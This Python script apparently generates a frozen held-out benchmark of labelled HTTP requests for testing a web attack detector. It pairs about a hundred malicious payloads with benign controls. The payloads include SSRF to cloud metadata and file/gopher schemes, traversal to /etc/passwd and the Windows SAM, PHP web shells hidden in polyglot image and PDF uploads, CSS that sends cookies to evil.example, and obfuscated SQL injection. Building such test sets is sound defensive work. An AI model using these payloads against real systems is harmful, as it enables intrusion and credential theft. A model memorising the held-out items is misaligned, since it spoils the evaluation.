#!/usr/bin/env python3
"""Generate heldout_v8.jsonl — clean held-out batch v8.

Families structurally absent from ALL v1-v7 tuning corpora and unified_v1:
cache deception, HTTP method override, non-HTTP URL schemes (gopher/dict/file),
DNS-rebinding hostname encodings, dotfile/VCS exposure, DOM clobbering,
CSS injection/exfiltration, absolute-URI request targets, header-injection
and IIS rewrite overrides, polyglot file uploads, attacks inside the path
segment itself, client-IP spoofing headers, double-encoded traversal,
SQL comment obfuscation, Windows backslash traversal, and null-byte
truncation.
"""
import json, hashlib

OUT = "benchmarks/real_comparative/corpus/heldout_v8.jsonl"

ATTACKS = {
 "cache_deception": [
  ("GET","/account/profile.css","",""),
  ("GET","/account/settings.js","",""),
  ("GET","/user/dashboard;.css","",""),
  ("GET","/api/private/data%2f..%2fstyle.css","",""),
  ("GET","/profile/nonexistent.css/../account","",""),
  ("GET","/account%2f..%2fpublic%2fstyle.css","",""),
  ("GET","/account/profile.css%3f","",""),
  ("GET","/account/settings;.js","",""),
 ],
 "method_override": [
  ("POST","/api/user/1","",'<x/>',{"X-HTTP-Method-Override":"DELETE"}),
  ("POST","/api/user/1","",'<x/>',{"X-HTTP-Method":"PUT"}),
  ("POST","/api/admin","",'a=1',{"X-Method-Override":"DELETE","X-Original-Method":"GET"}),
  ("POST","/api/items","",'a=1',{"X-HTTP-Method-Override":"PATCH"}),
  ("POST","/api/account","",'a=1',{"X-Original-URL":"/api/admin"}),
  ("GET","/api/items/1","","",{"X-Rewrite-URL":"/api/admin/users"}),
  ("POST","/api/items","",'a=1',{"X-Override":"DELETE"}),
  ("POST","/api/user","",'a=1',{"X-HTTP-Method-Override":"TRACE"}),
 ],
 "url_scheme_abuse": [
  ("GET","/api/fetch","url=gopher://evil.example:70/_GET%20/admin",""),
  ("GET","/api/fetch","url=dict://evil.example:2628/stat",""),
  ("GET","/api/fetch","url=file:///etc/passwd",""),
  ("GET","/api/fetch","url=ldap://evil.example:389/cn=x",""),
  ("GET","/api/fetch","url=tftp://evil.example/x",""),
  ("GET","/api/fetch","url=jar:file:///tmp/x.jar!/x",""),
  ("GET","/api/proxy","target=ftp://anonymous:pass@evil.example/x",""),
  ("GET","/api/fetch","url=sftp://evil.example/x",""),
 ],
 "dns_rebinding": [
  ("GET","/api/fetch","url=http://127.0.0.1.nip.io/admin",""),
  ("GET","/api/fetch","url=http://169.254.169.254.nip.io/latest/meta-data",""),
  ("GET","/api/fetch","url=http://localtest.me/x",""),
  ("GET","/api/fetch","url=http://2130706433/x",""),
  ("GET","/api/fetch","url=http://0x7f000001/x",""),
  ("GET","/api/fetch","url=http://0177.0.0.1/x",""),
  ("GET","/api/fetch","url=http://spoofed.burpcollaborator.net/x",""),
  ("GET","/api/fetch","url=http://lvh.me:8080/admin",""),
 ],
 "dotfile_exposure": [
  ("GET","/.git/config","",""),
  ("GET","/.git/HEAD","",""),
  ("GET","/.env","",""),
  ("GET","/.svn/entries","",""),
  ("GET","/.hg/store/00manifest.i","",""),
  ("GET","/WEB-INF/web.xml","",""),
  ("GET","/.dockerenv","",""),
  ("GET","/.aws/credentials","",""),
 ],
 "dom_clobbering": [
  ("POST","/api/comment","",'<form id="location" action="//evil.example"></form>'),
  ("POST","/api/comment","",'<a id="x" href="javascript:alert(1)">x</a><form action="x">'),
  ("POST","/api/comment","",'<base href="//evil.example/">'),
  ("POST","/api/comment","",'<img name="location" src=x><form name="x" action="//evil/x">'),
  ("POST","/api/comment","",'<svg><a xlink:href="javascript:alert(1)"><text>x</text></a></svg>'),
  ("POST","/api/comment","",'<input name="document.cookie" value="session=evil">'),
  ("POST","/api/comment","",'<form><button formaction="javascript:alert(1)">go</button></form>'),
  ("POST","/api/comment","",'<object data="//evil.example/x.swf"></object>'),
 ],
 "css_injection": [
  ("POST","/api/profile","","color:red;position:fixed;top:0;left:0;width:100%;height:100%;background:url(//evil.example/steal?c='+document.cookie+')"),
  ("POST","/api/profile","",'</style><script>alert(1)</script><style>'),
  ("POST","/api/theme","",'body{background:url(javascript:alert(1))}'),
  ("POST","/api/theme","",'@import url("//evil.example/x.css");'),
  ("POST","/api/profile","",'width:expression(alert(1))'),
  ("POST","/api/theme","",'behavior:url(xss.htc)'),
  ("POST","/api/profile","",'-moz-binding:url("//evil.example/x.xml#xss")'),
  ("POST","/api/theme","",'content:"</style><img src=x onerror=alert(1)>"'),
 ],
 "absolute_uri": [
  ("GET","http://evil.example/admin","",""),
  ("GET","//evil.example/x","",""),
  ("GET","http://169.254.169.254/latest/meta-data","",""),
  ("GET","http://localhost:8080/admin","",""),
  ("GET","http://internal.corp/x","",""),
  ("GET","http://0.0.0.0:22/","",""),
 ],
 "header_injection": [
  ("GET","/api/x","","",{"X-Forwarded-Host":"evil.example\r\nSet-Cookie: session=evil"}),
  ("GET","/api/x","","",{"X-Forwarded-Host":"evil.example"}),
  ("GET","/api/x","","",{"X-Original-Host":"evil.example"}),
  ("GET","/api/x","","",{"X-Host":"evil.example"}),
  ("GET","/api/x","","",{"Forwarded":"host=evil.example;proto=http"}),
  ("GET","/api/x","","",{"X-Forwarded-Server":"evil.example"}),
  ("GET","/api/x","","",{"X-HTTP-Host-Override":"evil.example"}),
  ("GET","/api/x","","",{"X-Forwarded-Host":"trusted.com@evil.example"}),
 ],
 "polyglot_upload": [
  ("POST","/upload","",'GIF89aPK\x03\x04jar-content',{"Content-Type":"image/gif","Content-Disposition":"attachment; filename=evil.gif"}),
  ("POST","/upload","",'GIF89a<?php system($_GET[c]); ?>',{"Content-Type":"image/gif","Content-Disposition":"attachment; filename=evil.gif"}),
  ("POST","/upload","",'%PDF-1.4\n<?php echo `id`; ?>',{"Content-Type":"application/pdf","Content-Disposition":"attachment; filename=doc.pdf"}),
  ("POST","/upload","",'MZ\x90\x00html<script>alert(1)</script>',{"Content-Type":"application/x-msdownload","Content-Disposition":"attachment; filename=setup.exe"}),
  ("POST","/upload","",'\x89PNG\r\n\x1a\n<?php phpinfo();?>',{"Content-Type":"image/png","Content-Disposition":"attachment; filename=img.png"}),
  ("POST","/upload","",'PK\x03\x04GIF89a',{"Content-Type":"application/zip","Content-Disposition":"attachment; filename=bundle.zip"}),
 ],
 "injection_in_path": [
  ("GET","/user/admin' OR '1'='1","",""),
  ("GET","/search/<script>alert(1)</script>","",""),
  ("GET","/img/onerror=alert(1)","",""),
  ("GET","/api/../../etc/passwd","",""),
  ("GET","/user/1;cat /etc/passwd","",""),
  ("GET","/search?q'--","",""),
  ("GET","/api/items/1%20UNION%20SELECT%20password","",""),
  ("GET","/download/../../windows/system32/config/sam","",""),
 ],
 "ip_header_spoofing": [
  ("GET","/api/admin","","",{"X-Forwarded-For":"127.0.0.1"}),
  ("GET","/api/admin","","",{"X-Real-IP":"127.0.0.1"}),
  ("GET","/api/admin","","",{"X-Client-IP":"127.0.0.1"}),
  ("GET","/api/admin","","",{"True-Client-IP":"127.0.0.1"}),
  ("GET","/api/admin","","",{"CF-Connecting-IP":"127.0.0.1"}),
  ("GET","/api/admin","","",{"X-Forwarded-For":"127.0.0.1, 8.8.8.8"}),
  ("GET","/api/admin","","",{"X-Originating-IP":"127.0.0.1"}),
  ("GET","/api/admin","","",{"X-Remote-IP":"127.0.0.1"}),
 ],
 "double_encoding": [
  ("GET","/%252e%252e%252fetc%252fpasswd","",""),
  ("GET","/api/%252e%252e%252f%252e%252e%252fetc%252fpasswd","",""),
  ("GET","/files/%252e%252e/%252e%252e/etc/shadow","",""),
  ("GET","/static/%252e%252e%255c%252e%252e%255cwindows%255cwin.ini","",""),
  ("GET","/img/%252e%252e%252f%252e%252e%252fproc%252fself%252fenviron","",""),
  ("GET","/download?f=%252e%252e%252f%252e%252e%252fetc%252fpasswd","",""),
 ],
 "comment_evasion": [
  ("GET","/api/search","q=UN/**/ION SEL/**/ECT password FROM users--",""),
  ("GET","/api/search","q=SEL%0aECT%23%0apassword",""),
  ("GET","/api/search","q=UN%0aION%0aSEL%0aECT%0apassword",""),
  ("GET","/api/search","q=adm/**/in'/**/OR/**/'1'='1",""),
  ("GET","/api/search","q=1'/*!50000UNION*/ /*!50000SELECT*/ user()--",""),
  ("GET","/api/search","q=1' U%4eION S%45LECT password--",""),
  ("GET","/api/search","q=1'+(SEL/**/ECT(1))--",""),
  ("GET","/api/search","q=1'%20OR%20(SELECT(0)FROM(SELECT(SLEEP(5)))x)--",""),
 ],
 "windows_traversal": [
  ("GET","/download","f=..\\..\\windows\\system32\\config\\sam",""),
  ("GET","/download","f=..%5c..%5cwindows%5cwin.ini",""),
  ("GET","/files/..%5c..%5c..%5cetc%5cpasswd","",""),
  ("GET","/download","f=C:\\Windows\\System32\\drivers\\etc\\hosts",""),
  ("GET","/download","f=....\\\\....\\\\etc\\\\passwd",""),
  ("GET","/download","f=%2e%2e%5c%2e%2e%5cboot.ini",""),
  ("GET","/download","f=..%c0%af..%c0%afetc/passwd",""),
  ("GET","/download","f=..%ef%bc%8f..%ef%bc%8fetc/passwd",""),
 ],
 "null_byte": [
  ("GET","/download","f=../../etc/passwd%00.jpg",""),
  ("GET","/download","f=shell.php%00.jpg",""),
  ("GET","/api/file","path=/etc/passwd%00.html",""),
  ("GET","/api/file","name=admin%00.png",""),
  ("POST","/upload","",'--x\r\nContent-Disposition: form-data; name="f"; filename="shell.php%00.jpg"\r\n\r\n<?php system($_GET[c]); ?>\r\n--x--'),
  ("GET","/api/data","x=1%00<script>alert(1)</script>",""),
 ],
}

BENIGN = [
 ("GET","/account/profile","",""),
 ("GET","/account/settings","",""),
 ("POST","/api/user/1","",'<x/>'),
 ("GET","/api/items","",""),
 ("GET","/api/fetch","url=https://example.com/docs",""),
 ("GET","/api/fetch","url=https://api.github.com/repos",""),
 ("GET","/api/proxy","target=https://cdn.example.com/lib.js",""),
 ("GET","/robots.txt","",""),
 ("GET","/sitemap.xml","",""),
 ("GET","/.well-known/security.txt","",""),
 ("GET","/api/x","","",{"X-Forwarded-For":"8.8.8.8"}),
 ("GET","/api/x","","",{"X-Forwarded-Host":"api.example.com"}),
 ("GET","/api/x","","",{"Forwarded":"for=8.8.8.8;proto=https"}),
 ("POST","/api/profile","",'color:blue;font-size:14px'),
 ("POST","/api/theme","",'body{background:#fff;color:#333}'),
 ("POST","/api/comment","",'<p>Great post, thanks!</p>'),
 ("POST","/api/comment","",'<a href="https://example.com">link</a>'),
 ("POST","/api/comment","",'<form action="/search" method="get"><input name="q"></form>'),
 ("POST","/upload","",'%PDF-1.4\n1 0 obj<</Type/Catalog>>endobj',{"Content-Type":"application/pdf","Content-Disposition":"attachment; filename=doc.pdf"}),
 ("POST","/upload","",'GIF89a<jpeg-bytes>',{"Content-Type":"image/gif","Content-Disposition":"attachment; filename=anim.gif"}),
 ("GET","/user/john.doe","",""),
 ("GET","/search/caf%C3%A9","",""),
 ("GET","/search/%C3%A9t%C3%A9","",""),
 ("GET","/download","f=report%202024.pdf",""),
 ("GET","/download","f=invoice-final.xlsx",""),
 ("GET","/api/file","path=docs/guide.txt",""),
 ("GET","/api/file","name=avatar.png",""),
 ("GET","/static/css/style.css","",""),
 ("GET","/static/js/app.js","",""),
 ("GET","/img/logo.png","",""),
 ("GET","/api/search","q=SELECT+%2A+FROM+products+WHERE+price%3C10",""),  # SQL words in a search query — trap
 ("GET","/api/search","q=union+select+meaning",""),
 ("GET","/api/docs","page=1&limit=20",""),
 ("GET","/api/status","version=1.2.3",""),
 ("GET","/blog/post/my-first-post","",""),
 ("GET","/","x-forwarded-for=8.8.8.8",""),
 ("POST","/api/orders","",'{"items":[{"sku":"A1","qty":2}]}'),
 ("GET","/api/cart","qty=3",""),
 ("GET","/api/health","",""),
 ("HEAD","/api/status","",""),
 ("OPTIONS","/api/data","",""),
 ("GET","/favicon.ico","",""),
 ("GET","/manifest.json","",""),
 ("GET","/api/config","env=prod",""),
 ("GET","/api/search","q=what+is+css+injection",""),
 ("GET","/api/search","q=how+does+cache+deception+work",""),
 ("GET","/api/tags","tag=javascript",""),
 ("POST","/api/notes","",'text=my+file+is+C%3A%5Ctemp%5Ctest.txt'),
]

def mk(case_id, cat, label, note, method, path, query, body, headers=None, split="held_out"):
    return {
        "case_id": case_id, "category": cat, "corpus": "heldout_v8",
        "corpus_sha256": None, "corpus_version": None,
        "label": label, "note": note,
        "request": {"body": body, "headers": headers or {}, "method": method,
                    "path": path, "query": query},
        "split": split,
        "split_reason": ("Frozen held-out batch v8: techniques absent from v1-v7 tuning."
                         if label == "malicious" else "Benign control written independently of engine internals."),
    }

notes = {c: f"v8 fresh techniques for {c}." for c in ATTACKS}
notes["benign"] = "Benign control v8."

cases=[]
for cat,payloads in ATTACKS.items():
    for i,(m,p,q,b,*rest) in enumerate(payloads):
        cases.append(mk(f"heldout_v8/{cat}-{i:02d}",cat,"malicious",notes[cat],m,p,q,b,rest[0] if rest else {}))
for i,(m,p,q,b,*rest) in enumerate(BENIGN):
    cases.append(mk(f"heldout_v8/benign-{i:03d}","benign","benign",notes["benign"],m,p,q,b,rest[0] if rest else {}))

with open(OUT,"w",encoding="utf-8",newline="\n") as f:
    for c in cases: f.write(json.dumps(c,ensure_ascii=False)+"\n")
lines=[json.loads(l) for l in open(OUT,encoding="utf-8")]
sha=hashlib.sha256(open(OUT,"rb").read()).hexdigest()
for c in lines: c["corpus_sha256"]=sha
with open(OUT,"w",encoding="utf-8",newline="\n") as f:
    for c in lines: f.write(json.dumps(c,ensure_ascii=False)+"\n")
mal=[c for c in cases if c["label"]=="malicious"]; ben=[c for c in cases if c["label"]=="benign"]
print(f"wrote {len(cases)} cases -> {OUT}")
print(f"malicious={len(mal)} benign={len(ben)} sha256={sha[:16]}")
from collections import Counter
print(Counter(c["category"] for c in mal))
